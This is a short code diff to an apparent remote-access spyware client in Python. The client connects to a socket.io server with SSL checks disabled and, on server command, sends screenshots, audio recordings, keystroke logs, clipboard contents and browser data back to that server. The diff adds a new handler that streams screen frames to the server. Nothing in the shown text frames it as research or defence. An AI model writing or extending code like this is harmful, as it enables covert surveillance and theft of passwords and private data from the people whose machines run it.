@@ -5,8 +5,7 @@ import time
 import socketio
 
 from database_utils import send_browser_data
-from media_utils import take_and_send_screenshot, record_and_send_audio, record_and_send_keyboard_log, \
-    get_clipboard_content
+from media_utils import take_and_send_screenshot, record_and_send_audio, record_and_send_keyboard_log, gen_frames, get_clipboard_content
 
 sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)
 
@@ -58,6 +57,11 @@ def command(data):
         record_and_send_keyboard_log(duration, sio)
     elif command == 'papier':
         get_clipboard_content(sio)
+
+
+@sio.event
+def start_stream():
+    gen_frames(sio)
 
 
 def attempt_reconnect():
